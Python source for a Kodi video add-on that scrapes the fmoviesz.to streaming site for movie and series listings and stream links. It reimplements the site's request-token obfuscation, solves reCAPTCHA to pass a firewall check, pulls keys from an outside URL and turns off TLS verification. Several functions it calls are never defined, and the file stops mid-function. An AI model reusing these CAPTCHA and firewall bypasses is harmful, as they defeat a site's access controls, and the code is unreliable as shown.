# -*- coding: UTF-8 -*-

import sys, os, re, json, base64
if sys.version_info >= (3,0,0):
# for Python 3
    to_unicode = str
    from resources.lib.cmf3 import parseDOM
    from resources.lib.cmf3 import replaceHTMLCodes
    from urllib.parse import unquote, parse_qs, parse_qsl, quote, urlencode, quote_plus

else:
    # for Python 2
    to_unicode = unicode
    from resources.lib.cmf2 import parseDOM
    from resources.lib.cmf2 import replaceHTMLCodes
    from urllib import unquote, quote, urlencode, quote_plus
    from urlparse import parse_qsl, parse_qs
    
import io

from resources.lib import recaptcha_v2

import xbmc, xbmcvfs

import requests
import xbmcgui
import xbmcplugin
import xbmcaddon

import resolveurl 

#urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
base_url = sys.argv[0]
addon_handle = int(sys.argv[1])
params = dict(parse_qsl(sys.argv[2][1:]))
addon = xbmcaddon.Addon(id='plugin.video.fmoviesto')

PATH            = addon.getAddonInfo('path')
try:
    DATAPATH        = xbmcvfs.translatePath(addon.getAddonInfo('profile'))
except:
    DATAPATH    = xbmc.translatePath(addon.getAddonInfo('profile')).decode('utf-8')
    
if not os.path.exists(DATAPATH):
    os.makedirs(DATAPATH)
    
jfilename = os.path.join(DATAPATH,'jfilename')
napisy = os.path.join(DATAPATH,'napisy')

RESOURCES      = PATH+'/resources/'

FANART=RESOURCES+'fanart.jpg'
mainurl = 'https://fmoviesz.to'
exlink = params.get('url', None)
nazwa= params.get('title', None)
rys = params.get('image', None)
page = params.get('page',[1])[0]


fsortv = addon.getSetting('fsortV')
fsortn = addon.getSetting('fsortN') if fsortv else 'default'

fkatv = addon.getSetting('fkatV')
fkatn = addon.getSetting('fkatN') if fkatv else 'all'

fkrajv = addon.getSetting('fkrajV')
fkrajn = addon.getSetting('fkrajN') if fkrajv else 'all'

frokv = addon.getSetting('frokV')
frokn = addon.getSetting('frokN') if frokv else 'all'

fwerv = addon.getSetting('fwerV')
fwern = addon.getSetting('fwerN') if fwerv else 'all'

fnapv = addon.getSetting('fnapV')
fnapn = addon.getSetting('fnapN') if fnapv else 'all'

fratyv = addon.getSetting('fratyV')
fratyn = addon.getSetting('fratyN') if fratyv else 'all'

sratyv = addon.getSetting('sratyV')
sratyn = addon.getSetting('sratyN') if sratyv else 'all'

snapv = addon.getSetting('snapV')
snapn = addon.getSetting('snapN') if snapv else 'all'

ssortv = addon.getSetting('ssortV')
ssortn = addon.getSetting('ssortN') if ssortv else 'default'

skatv = addon.getSetting('skatV')
skatn = addon.getSetting('skatN') if skatv else 'all'

skrajv = addon.getSetting('skrajV')
skrajn = addon.getSetting('skrajN') if skrajv else 'all'

srokv = addon.getSetting('srokV')
srokn = addon.getSetting('srokN') if srokv else 'all'

swerv = addon.getSetting('swerV')
swern = addon.getSetting('swerN') if swerv else 'all'

dataf =  addon.getSetting('fdata')  
datas =  addon.getSetting('sdata')  

wybornapisow = True

UA='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0'

headers = {
    'User-Agent': UA,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'pl,en-US;q=0.7,en;q=0.3',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'TE': 'Trailers',
}
sess = requests.Session()
def build_url(query):
    return base_url + '?' + urlencode(query)

def add_item(url, name, image, mode, folder=False, IsPlayable=False, infoLabels=False, movie=True,itemcount=1, page=1,fanart=FANART,moviescount=0):
    list_item = xbmcgui.ListItem(label=name)

    if IsPlayable:
        list_item.setProperty("IsPlayable", 'True')
    if not infoLabels:
        infoLabels={'title': name,'plot':name}
    list_item.setInfo(type="video", infoLabels=infoLabels)  
    list_item.setArt({'thumb': image, 'poster': image, 'banner': image, 'icon': image, 'fanart': FANART})
    ok=xbmcplugin.addDirectoryItem(
        handle=addon_handle,
        url = build_url({'mode': mode, 'url' : url, 'page' : page, 'moviescount' : moviescount,'movie':movie,'title':name,'image':image}),          
        listitem=list_item,
        isFolder=folder)
    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask = "%R, %Y, %P")
    return ok
    
def menuMovies():
    add_item(mainurl+'/filter?keyword=&type[]=movie', 'List movies', 'DefaultMovies.png', "listmovies", True) 
    add_item('', "-   [COLOR lightblue]sort:[/COLOR] [B]"+fsortn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fsort', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]country:[/COLOR] [B]"+fkrajn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fkraj', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]genre:[/COLOR] [B]"+fkatn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fkat', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]year:[/COLOR] [B]"+frokn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:frok', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]quality:[/COLOR] [B]"+fwern+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fwer', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]rating:[/COLOR] [B]"+fratyn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fraty', folder=False,fanart='')
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)  
    add_item('f', "[I][COLOR violet][B]Reset all filters[/COLOR][/I][/B]",'DefaultAddonService.png', "resetfil", folder=False)

    xbmcplugin.endOfDirectory(addon_handle)
    
def menuTVshows():
    add_item(mainurl+'/filter?keyword=&type[]=tv', 'List tv-series', 'DefaultMovies.png', "listmovies", True) 
    add_item('', "-   [COLOR lightblue]sort:[/COLOR] [B]"+ssortn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:ssort', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]country:[/COLOR] [B]"+skrajn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:skraj', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]genre:[/COLOR] [B]"+skatn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:skat', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]year:[/COLOR] [B]"+srokn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:srok', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]quality:[/COLOR] [B]"+swern+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:swer', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]rating:[/COLOR] [B]"+sratyn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:sraty', folder=False,fanart='')
    
    
    add_item('s', "[I][COLOR violet][B]Reset all filters[/COLOR][/I][/B]",'DefaultAddonService.png', "resetfil", folder=False)
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)  
    xbmcplugin.endOfDirectory(addon_handle)
def home():
    try:
        if addon.getSetting('pic')!='1':
            ResetAllFilters()
    except:
        pass
    add_item(mainurl+'/movies', 'Movies', 'DefaultMovies.png', "menumov", True)   
    add_item(mainurl+'/movies', 'TV-Series', 'DefaultMovies.png', "menutvs", True)    
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)  

    xbmcplugin.endOfDirectory(addon_handle)
    
def ResetAllFilters()   :
    for x in ['f','s']:
        addon.setSetting(x+'sortN','default')
        addon.setSetting(x+'sortV','&sort=default')
        
        addon.setSetting(x+'katN','all')
        addon.setSetting(x+'katV','')
        
        addon.setSetting(x+'krajN','all')
        addon.setSetting(x+'krajV','')
        
        addon.setSetting(x+'rokN','all')
        addon.setSetting(x+'rokV','')
        
        addon.setSetting(x+'napN','all')
        addon.setSetting(x+'napV','')
        
        
        addon.setSetting(x+'ratyN','all')
        addon.setSetting(x+'ratyV','')
        
        addon.setSetting(x+'data','&sort=default')
        addon.setSetting('pic','1')
        return
def ListMovies(exlink,page):

    links, serials, pagin = getMovies(exlink,page)

    itemz=links
    items = len(links)
    mud='getLinks'
    fold=True
    for f in itemz:
        add_item(name=f.get('title'), url=f.get('href'), mode=mud, image=f.get('img'), folder=fold, infoLabels={'plot':f.get('title'),'title':f.get('title')}, itemcount=items, IsPlayable=False)   
    itemzx=serials
    items = len(serials)
    mud='getseasons'
    fold=True
    for f in itemzx:
        add_item(name=f.get('title'), url=f.get('href'), mode=mud, image=f.get('img'), folder=fold, infoLabels={'plot':f.get('title'),'title':f.get('title')}, itemcount=items) 
    
    if pagin:
        add_item(name='[COLOR blue]>> Next page [/COLOR]', url=exlink, mode='listmovies', image='', folder=True, page=pagin)
    if links or serials:
        xbmcplugin.setContent(addon_handle, 'videos')   

        xbmcplugin.endOfDirectory(addon_handle)     

def getMovies(url,page=1):

    #if not 'search?keyword' in url:
    if '?keyword=&' in url:
        datax = datas if '=tv' in url else dataf
    
        if '&page=' in url:
        
            url = re.sub('\&page=\\d+','&page=%d'%int(page),url)
        else:
        
            url = url +datax+ '&page=%d' %int(page)
    else:
        if '&page=' in url:
        
            url = re.sub('\&page=\\d+','&page=%d'%int(page),url)
        else:
        
            url = url +'&page=%d' %int(page)
    
    nturl = '&amp;page=%d"' %(int(page)+1) 
    #xbmc.log('urlurlurlurlurlurlurlurlurlurlurl: %s'%str(url), level=xbmc.LOGINFO)
    r = sess.get(url,verify=False, headers=headers)
    html=r.content
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    out=[]
    serout=[]

    npage=False

    pagination = parseDOM(html, 'ul', attrs={'class': "pagination"}) 
    if pagination:
        npage = str(int(page)+1)if nturl in pagination[0] else False

    result = parseDOM(html, 'div', attrs={'class': "movies\s+.*?"}) [0]
    ids = [(a.start(), a.end()) for a in re.finditer('<div class="item"', result)]
    ids.append( (-1,-1) )
    out=[]
    serout=[]
    for i in range(len(ids[:-1])):
        link = result[ ids[i][1]:ids[i+1][0] ]
        try:
            imag= parseDOM(link, 'img', ret='src')[0]
        except:
            imag= parseDOM(link, 'img', ret='data-src')[0]
        imag = 'https:'+imag if imag.startswith('//') else imag
        title= parseDOM(link, 'a')[-1]
        
        href = parseDOM(link, 'a', ret='href')[-1]
        id =re.findall('([^\-]+$)',href)[0]
        href = mainurl+href if href.startswith('/') else href
        typ = parseDOM(html, 'i', attrs={'class': "type"})
        typ = typ[0].strip() if typ else ''
            
        
        
        
        plot =''

        ploturl = re.findall('data\-tip\s*=\s*"(.+?)"',link)[0]
        ploturl = mainurl+'/ajax/film/tooltip/'+ ploturl
        genre =''
        code =''
        year =''
        meta = parseDOM(link, 'div', attrs={'class': "meta"})[0]
        try:
            year = re.findall('(\d{4})', meta)[0]
        except:
            year = ''

        if '.to/tv/' in href:
            # title = title + ' [COLOR gold](serie)[/COLOR]'
            serout.append({'title':PLchar(title),'href':href+'|'+id,'img':imag,'plot':PLchar(plot),'genre':genre,'year':year,'code':code})
        else:
            title = '{} ({})'.format(title,year)
            out.append({'title':PLchar(title),'href':href+'|'+id,'img':imag,'plot':PLchar(plot),'genre':genre,'year':year,'code':code})
    return (out,serout, npage) 
    
def endEN(t, n) :
    return t + n;

def rLMxL(t, n):
    return t < n;

def VHtgA (t, n) :
    return t % n;

def DxlFU(t, n) :
    return rLMxL(t, n);

def dec2(t, n) :
    o=[]
    s=[]
    u=0
    h=''
    for e in range(256):
        s.append(e)

    for e in range(256):
        u = endEN(u + s[e],ord(t[e % len(t)])) % 256
        o = s[e];
        s[e] = s[u];
        s[u] = o;
    e=0
    u=0
    c=0
    for c in range(len(n)):
        e = (e + 1) % 256
        o = s[e]
        u = VHtgA(u + s[e], 256)
        s[e] = s[u];
        s[u] = o;
        try:
            h += chr((n[c]) ^ s[(s[e] + s[u]) % 256]);
        except:
            h += chr(ord(n[c]) ^ s[(s[e] + s[u]) % 256]);
    #print (h)
    return h

def getVerid(id):
###### 12.07.23     
    def convert_func(matchobj):
        m =  matchobj.group(0)

        if m <= 'Z':
            mx = 90
        else:
            mx = 122
        mx2 = ord( m)+ 13  
        if mx>=mx2:
            mx = mx2
        else:
            mx = mx2-26
        gg = chr(mx)
        return gg


    def butxx(t):
        o=''
        for s in range(len(t)):
            u = ord(t[s]) 
            if u==0:
                u=0
            else:
                if (s % 6 == 1):
                    u += 5
                else:
                    if (s % 6 == 5):
                        u -= 6
                    else:
                        if (s % 6 == 0 or s % 6 == 4):
                            u += 6
                        else:
                            if not (s % 6 != 3 and s % 6 != 2):
                                u -= 5
            o += chr(u) 
            
            
    def but(t):
        o=''
        for s in range(len(t)):
            u = ord(t[s]) 
            if u==0:
                u=0
            else:
                if (s % 5 == 1 or s % 5 == 4):
                    u -= 2
                else:
                    if (s % 5 == 3):
                        u += 5;
                    else:
                        if s % 5 == 0 :
                            u -= 4;
                        else:
                            if s % 5 == 2 :
                                u -= 6
            o += chr(u) 
            
            
            
        if sys.version_info >= (3,0,0):
            o=o.encode('Latin_1')

        if sys.version_info >= (3,0,0):
            o=(o.decode('utf-8'))

        return o
    ab = 'DZmuZuXqa9O0z3b7' #####stare
    ab = 'MPPBJLgFwShfqIBx'
    ab = 'rzyKmquwICPaYFkU'
    ab = 'FWsfu0KQd9vxYGNB'
    ac = id
    hj = dec2(ab,ac) #

    if sys.version_info >= (3,0,0):
        hj=hj.encode('Latin_1')

    hj2 = encode2(hj)   

    if sys.version_info >= (3,0,0):
        hj2=(hj2.decode('utf-8'))
    hj2 = re.sub("[a-zA-Z]", convert_func, hj2) 
    if sys.version_info >= (3,0,0):
        hj2=hj2.encode('Latin_1')
    
    

    
    
    hj2 = encode2(hj2)   
    if sys.version_info >= (3,0,0):
        hj2=(hj2.decode('utf-8'))
        

    xc= but(hj2) 

    return xc
        
def getLinks(exlink):
    href,id = exlink.split('|')

    html = sess.get(href, headers=headers, verify=False).content

    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    idx=re.findall('data\-id\s*=\s*"([^"]+)"',html,re.DOTALL)
    if idx:
    
        result = parseDOM(html, 'section', attrs={'id': "w\-info.*?"})[0]  
        plot = parseDOM(result, 'div', attrs={'class': "description\s*cts.*?"}) 
        plot = PLchar(plot[0]) if plot else ''
        plot = re.sub("<[^>]*>","",plot)
        imag = parseDOM(result, 'img', ret='src')
        imag = imag[0] if imag else ''
        imag = 'https:'+imag if imag.startswith('//') else imag
        
        genres = re.findall('Genre\:(.+?)<\/div>',result)
        genres = genres[0] if genres else ''
        
        gg = re.findall('>([^<]+)<\/a>',genres)
        genre = ', '.join([(x.strip()).lower() for x in gg]) if gg else ''
        
        countries = re.findall('Country\:(.+?)<\/div>',result)  
        countries = countries[0] if countries else ''
        cc = re.findall('>([^<]+)<\/a>',countries)
        country = ', '.join([x.strip() for x in cc]) if gg else ''
        
        tim = re.findall('span>(\d+)\s*min<',result)
        tim = int(tim[0])*60 if tim else ''
        
        
        
        qual = parseDOM(result, 'span', attrs={'class': "quality"}) 
        qual = qual[0].strip() if qual else ''
        
        yr = parseDOM(result, 'span', attrs={'itemprop': "dateCreated"})  
        yr = yr[0].strip() if yr else ''
        infol = {'plot':plot,'genre': genre,'country':country,'duration':tim,'year':yr}
        
        headers.update({'Referer': href})

        if '.to/tv/' in href:
            verid = getVerid(id)
        else:
            
            idx = re.findall('class\s*=\s*"watch".*?data\-id\s*=\s*"([^"]+)',html,re.DOTALL)

            verid = getVerid(idx[0])
            params = (
            
                ('vrf', verid),
            
            )
            response = sess.get(mainurl+'/ajax/episode/list/'+idx[0], headers=headers, params=params, verify=False)

            html= (response.content)
    
            if sys.version_info >= (3,0,0):
                html = html.decode(encoding='utf-8', errors='strict')
            html= html.replace('\\"','"')   
            idx=re.findall('data\-id\s*=\s*"([^"]+)"',html,re.DOTALL)
            if not idx:
                xbmcgui.Dialog().notification('[B]Error[/B]', 'Links are not available.',xbmcgui.NOTIFICATION_INFO, 8000,False)
                return
            verid = getVerid(idx[0])
        recap="03AGdBq25eDJkrezDo2y"

        params = (

            ('vrf', verid),

        )
        if '.to/tv/' in href:
            response = sess.get(mainurl+'/ajax/server/list/'+id, headers=headers, params=params, verify=False)
        else:
            response = sess.get(mainurl+'/ajax/server/list/'+idx[0], headers=headers, params=params, verify=False)

        html= (response.content)
        if sys.version_info >= (3,0,0):
            html = html.decode(encoding='utf-8', errors='strict')
        html= html.replace('\\"','"')

        if 'sitekey=' in html:
        
            sitek=re.findall('data\-sitekey="(.+?)"',html)[0]
        
            token = recaptcha_v2.UnCaptchaReCaptcha().processCaptcha(sitek, lang='en')
        
            data = {
                    'g-recaptcha-response': token}
            
            response = sess.post(mainurl+'/waf-verify', headers=headers, data=data, cookies=sess.cookies, verify=False)
            
            params = (
                ('id', id),
                ('token', token),
            )
            response = sess.get(mainurl+'/ajax/film/servers', headers=headers, params=params, cookies=response.cookies, verify=False)
        
        html = (response.content)
        if sys.version_info >= (3,0,0):
            html = html.decode(encoding='utf-8', errors='strict')
        html= html.replace('\\"','"')

        linki = re.findall('data\-link\-id\s*=\s*"([^"]+).*?<span>([^<]+)',html)
        for linkid1,host in linki:
            tyt = nazwa+' - [I][COLOR khaki]'+host+'[/I] '+' [B][/COLOR][/B]'

            add_item(name=tyt, url=linkid1+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)
        
        
        
        
        if len(linki)>0:
        
            xbmcplugin.setContent(addon_handle, 'videos')
            xbmcplugin.endOfDirectory(addon_handle) 
        else:
            xbmcgui.Dialog().notification('[B]Error[/B]', 'Links are not available.',xbmcgui.NOTIFICATION_INFO, 8000,False)
        
def dec(chra):
    excludelist = ['\\xc4\\x99', '\\xc5\\x82', '\\xc5\\x81','\\xc4\\x98','\\xc5\\x9b','\\xc5\\x9a']
    
    try:    
        if sys.version_info >= (3,0,0):

            chra =repr(chra.encode('utf-8'))

            if any(exclude in chra for exclude in excludelist):
            
                return False
            chra = chra.replace('\\xc3\\xaa','ę').replace('\\xc3\\x8a','Ę')

            chra = chra.replace('\\xc3\\xa6','ć').replace('\\xc3\\x86','Ć')
            
            chra = chra.replace('\\xc2\\xbf','ż').replace('\\xc2\\x9f','Ż')
            
            chra = chra.replace('\\xc2\\xb9','ą').replace('\\xc2\\x99','Ą')
            
            chra = chra.replace('\\xc5\\x93','ś').replace('\\xc5\\x92','Ś')
            chra = chra.replace('\\xc3\\xb3','ó').replace('\\xc3\\x93','Ó')
            
            chra = chra.replace('\\xc5\\xb8','ź').replace('\\xc5\\xb7','Ź')
            
            chra = chra.replace('\\xc2\\xb3','ł').replace('\\xc2\\x93','Ł')
            
            chra = chra.replace('\\xc3\\xb1','ń').replace('\\xc3\\x91','Ń')
            

            
            chra = chra .replace("b\'",'')

            chra = chra .replace("\\n",'\n').replace("\\r",'\r') 
            chra = chra .replace("\\'","'")

        else:

            chra = chra.replace('\xc3\xaa','ę').replace('\xc3\x8a','Ę')
            chra = chra.replace('\xc3\xa6','ć').replace('\xc3\x86','Ć')
            chra = chra.replace('\xc2\xbf','ż').replace('\xc2\x9f','Ż')
            chra = chra.replace('\xc2\xb9','ą').replace('\xc2\x99','Ą')
            
            chra = chra.replace('\xc5\x93','ś').replace('\xc5\x92','Ś')
            chra = chra.replace('\xc3\xb3','ó').replace('\xc3\x93','Ó')
            
            chra = chra.replace('\xc5\xb8','ź').replace('\xc5\xb7','Ź')
            
            chra = chra.replace('\xc2\xb3','ł').replace('\xc2\x93','Ł')
            
            chra = chra.replace('\xc3\xb1','ń').replace('\xc3\x91','Ń')



    except:
        pass
        
    return chra
    
def transPolish(subtlink):

    try:
        response = sess.get(subtlink, headers=headers, verify=False)

        if sys.version_info >= (3,0,0):
        
            response  = response.text
        else:
            response  = response.content
        gg=dec(response)

        open(napisy, 'w').write(gg)

        return True
    except:
        return False
    
def PlayLink(exlink):
    id,href = exlink.split('|')
    
    verid = getVerid(id)
    
    params = (
        ('vrf', verid),
    )
    
    headers.update({'Referer': href})
    
    response = sess.get(mainurl+'/ajax/server/'+id, headers=headers, params=params, verify=False)
    
    ab=response.content
    if sys.version_info >= (3,0,0):
        ab = ab.decode(encoding='utf-8', errors='strict')
    
    
    try:
        jsonab = json.loads(ab)
    except:
        pass
    if jsonab:
        url = jsonab.get('result',None).get('url',None)
    
    link2 = DecodeLink(url)
    regs = ['?sub.info=', '&sub.info=', '?subtitle_json=', '&subtitle_json=']
    for x in regs:
        if x in link2:
            reg = x
            break
    try:
        link,subt = link2.split(reg)
    except:
        link = link2
        subt = ''
    
    subsout=[]
    
    subtx = unquote(subt)
    subt = False
    if subtx:
        if '&t=' in subtx:
            dd,dd2 = subtx.split('&t=')
            dd2 = quote_plus(dd2)
            subtx = dd+'&t='+dd2
        response = sess.get(subtx, headers=headers, verify=False).json()
    
        for subtitle in response:
            subt = subtitle.get('src',None)
            subt2 = subtitle.get('file',None)
            subt = subt if subt else subt2
            label = subtitle.get('label',None)
            if label.lower() == 'greek':
                label = 'Ελληνικά'
                subsout.insert(0, {'label':label,'subt':subt})
            else:
                subsout.append({'label':label,'subt':subt})
    if wybornapisow and subsout:
        labels = [x.get('label') for x in subsout]
        sel = xbmcgui.Dialog().select('Subtitle language',labels)   
        if sel>-1:
            subt=subsout[sel].get('subt')
            if subsout[sel].get('label') == 'Polish':
            
                subt = napisy if transPolish(subt) else subt
                
        else:
            subt = False

    if 'vidplay' in link2 or 'mcloud' in link2:# in link2 or 'vidsite' in link2:
        stream_url = decodeVidstream(link2)
    
    
    else:
        try:
            stream_url = resolveurl.resolve(link)
        except Exception as som:
            xbmcgui.Dialog().notification('[B]Error[/B]', str(som),xbmcgui.NOTIFICATION_INFO, 8000,False)
            quit()
    
    if stream_url:
        
        play_item = xbmcgui.ListItem(path=stream_url)
    
        if subt:
            play_item.setSubtitles([subt])
        xbmcplugin.setResolvedUrl(addon_handle, True, listitem=play_item)
        

def encode_id(id_):
    def endEN(t, n) :
        return t + n;
    
    def rLMxL(t, n):
        return t < n;
    
    def VHtgA (t, n) :
        return t % n;
    
    def DxlFU(t, n) :
        return rLMxL(t, n);
    
    def dec2(t, n) :
        o=[]
        s=[]
        u=0
        h=''
        for e in range(256):
            s.append(e)
    
        for e in range(256):
            u = endEN(u + s[e],ord(t[e % len(t)])) % 256
            o = s[e];
            s[e] = s[u];
            s[u] = o;
        e=0
        u=0
        c=0
        for c in range(len(n)):
            e = (e + 1) % 256
            o = s[e]
            u = VHtgA(u + s[e], 256)
            s[e] = s[u];
            s[u] = o;
            try:
                h += chr((n[c]) ^ s[(s[e] + s[u]) % 256]);
            except:
                h += chr(ord(n[c]) ^ s[(s[e] + s[u]) % 256]);

        return h
        
# ============== keys taken from aniyomi-extensions - from 9anime extension ================    
        
    klucze = requests.get('https://raw.githubusercontent.com/matecky/bac/keys/keys.json', verify=False).json()
    k1 = klucze[0]
    k2 = klucze[1]
    cbn = dec2(k1,id_)
    try:
        #python 3
        cbn = cbn.encode('Latin_1')
    except:
        #python 2
        cbn = cbn.decode('Latin_1')
        pass
    cbn = dec2(k2,cbn)
    try:
        #python 3
        cbn = cbn.encode('Latin_1')
    except:
        #python 2
        pass

    vrfx = base64.b64encode(cbn)#
    v = vrfx.decode('utf-8')
    v = v.replace('/','_')
    return v    

def decodeVidstream(query):

    from requests.compat import urlparse
    link = ''
    uax = 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0'
    ref = query
    hd ={'user-agent':  uax,'Referer': ref}
    domain = urlparse(query).netloc
    domain = 'vidplay.site' if 'vidplay' in domain else domain
    futokenurl = 'https://'+domain+'/futoken'
    futoken = requests.get(futokenurl, verify=False).text
    print(futoken)
    k=re.findall("k='([^']+)'",futoken,re.DOTALL)[0]
    if 'vidplay' in query:

        query = query.split('/e/')[1].split('?')

    else:
        query = query.split('e/')[1].split('?')
    v = encode_id(query[0])
    a = [k];
    for i in range(len(v)):
        w = ord(k[i % len(k)])
        z = ord(v[i])
        x=int(w)+int(z)
        a.append(str(x))#

    urlk = 'https://'+domain+'/mediainfo/'+",".join(a)+'?'+query[1]

    ff=requests.get(urlk, headers=hd,verify=False).text
    if 'status":200' in ff:
        srcs = (json.loads(ff)).get('result',None).get('sources',None)
        for src in srcs:
            fil = src.get('file',None)
            if 'm3u8' in fil:
                link = fil+'|User-Agent='+uax+'&Referer='+ref
                break
    
    return link

def DecodeLink(mainurl):
    mainurl = mainurl.replace('_', '/').replace('-', '+')
    #
    ab=mainurl[0:6]   #23.09.21
    ac2 = mainurl[6:]   #23.09.21
    ac2 = mainurl#[6:]  #23.09.21
    
    
    
    #ab = 'DZmuZuXqa9O0z3b7'
    ab= 'hlPeNwkncH0fq9so'
    ab = '8z5Ag5wgagfsOuhz'
    
    ac= decode2(mainurl)
    
    link = dekoduj(ab,ac)
    link = unquote(link)
    return link


    
def getFileJson():

    from contextlib import closing
    from xbmcvfs import File
    
    with closing(File(jfilename)) as f:
        jsondata = f.read()
        
    jsondata = json.loads(jsondata)

    html =   jsondata.get('result',None)
    return html


def getLinksSerial(hrefx):

    href,servid = hrefx.split('|')

    html = sess.get(href, headers=headers, verify=False).content
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    
    result = parseDOM(html, 'section', attrs={'id': "w\-info"})[0] 
    plot = parseDOM(result, 'div', attrs={'class': "description.*?"})
    
    mname = parseDOM(result, 'h1', attrs={'itemprop': "name","class":"name"}) 
    mname = '[B]'+mname[0]+'[/B] ' if mname else ''
    
    plot = mname+'[CR]'+plot[0] if plot else ''
    imag = parseDOM(result, 'img', ret='src')
    imag = imag[0] if imag else ''
    imag = 'https:'+imag if imag.startswith('//') else imag
    
    genres = re.findall('Genre\:(.+?)<\/div>',result)
    genres = genres[0] if genres else ''
    
    gg = re.findall('>([^<]+)<\/a>',genres)
    genre = ', '.join([(x.strip()).lower() for x in gg]) if gg else ''
    
    countries = re.findall('Country\:(.+?)<\/div>',result) 
    countries = countries[0] if countries else ''
    cc = re.findall('>([^<]+)<\/a>',countries)
    country = ', '.join([x.strip() for x in cc]) if gg else ''
    
    tim = re.findall('span>(\d+)\s*min<',result)
    tim = int(tim[0])*60 if tim else ''
    
    
    
    qual = parseDOM(result, 'span', attrs={'class': "quality"}) 
    qual = qual[0].strip() if qual else ''
    
    yr = parseDOM(result, 'span', attrs={'class': "year"})  
    yr = yr[0].strip() if yr else ''
    infol = {'plot':plot,'genre': genre,'country':country,'duration':tim,'year':yr}
    
    
    servid = 1
    try:
        href1,serwery = re.findall("""href="([^"]+)"\\n\s*data-kname="%s".*?data\-ep=\\'({.*?)}"""%(hrefx),htmlx,re.DOTALL)[0]
    except:
        servid = 0

    href = mainurl+href1 if href1.startswith('/') else href1

    linki = re.findall('data-id="([^"]+).*?<div>([^<]+)',htmlx,re.DOTALL)
    
    
    
    
    
    
    
    
    nazwax = '- '+nazwa if mname else nazwa
    
    for linkid1,host in linki:
        tyt = mname + nazwax+' - [I][COLOR khaki]'+host+'[/I][/COLOR] '
    
        linkid = re.findall(linkid1+'"\:"([^"]+)',serwery)
        if linkid:
            add_item(name=tyt, url=linkid[0]+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)

    if servid:
        xbmcplugin.setContent(addon_handle, 'videos')
        xbmcplugin.endOfDirectory(addon_handle) 
    else:
        xbmcgui.Dialog().notification('[B]Error[/B]', 'Links are not available.',xbmcgui.NOTIFICATION_INFO, 8000,False)

def ListEpisodes(exlink):

    links= getEpisodes(exlink)  
    items = len(links)
    for f in links:
        add_item(name=f.get('title'), url=f.get('href'), mode='getLinks', image=f.get('img'), folder=True, infoLabels= {'plot':nazwa}, itemcount=items, IsPlayable=False)
    
    xbmcplugin.setContent(addon_handle, 'files')    

    xbmcplugin.endOfDirectory(addon_handle) 
    
def getEpisodes(href):
    seaz,serv = href.split('|')

    html =   getFileJson() 

    episodes = parseDOM(html,'ul', attrs={'class': "episodes",'data\-season': str(seaz)})[0] 
    
    
    
    out=[]

    epizody = parseDOM(episodes, 'li')

    for epi in epizody:

        kname = re.findall('data\-id\s*=\s*"([^"]+)"',epi,re.DOTALL)[0]

        seas = 'S%02d'%int(seaz)
        epis = re.findall('data\-num\s*=\s*"([^"]+)"',epi,re.DOTALL)[0]
        try:
            episod = 'E%02d'%int(epis)
        except:
            episod = 'E-%s'%str(epis)

        title = re.findall('span>\s*<span>([^<]+)',epi,re.DOTALL)
        if title:
            title = re.sub("<[^>]*>","",title[0].strip())
        else:
            title = nazwa.split('-')[-1]
        title = title+' ('+seas+episod+')'
        href = parseDOM(epi, 'a', ret='href')[-1]
        href = mainurl+href if href.startswith('/') else href
        
        out.append({'title':title ,'href':href+'|'+kname,'img':rys})

    return out
def ListSeasons(exlink):

    links= getSerial(exlink)    
    items = len(links)
    for f in links:
        add_item(name=f.get('title'), url=f.get('href'), mode='getEpisodes', image=f.get('img'), folder=True, infoLabels= {'plot':nazwa}, itemcount=items, IsPlayable=False)
    xbmcplugin.setContent(addon_handle, 'files')    

    xbmcplugin.endOfDirectory(addon_handle) 
    
def getSerial(href):

    out=[]
    href,id = href.split('|')

    headers.update({'Referer': href})
    html = sess.get(href, headers=headers, verify=False).content

    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    idx=re.findall('data\-id\s*=\s*"([^"]+)"',html,re.DOTALL)#[0]
    #i#f idx:
    recap =      addon.getSetting('cap_token')
    if not recap:
    
    
        recap="03AGdBq25eDJkrezDo2y"

    if idx:
        verid = getVerid(idx[0])    

        params = (
            ('vrf', verid),
        
        )

        response = sess.get(mainurl+'/ajax/episode/list/'+idx[0], headers=headers, params=params, verify=False)
        

        html = (response.content)
        
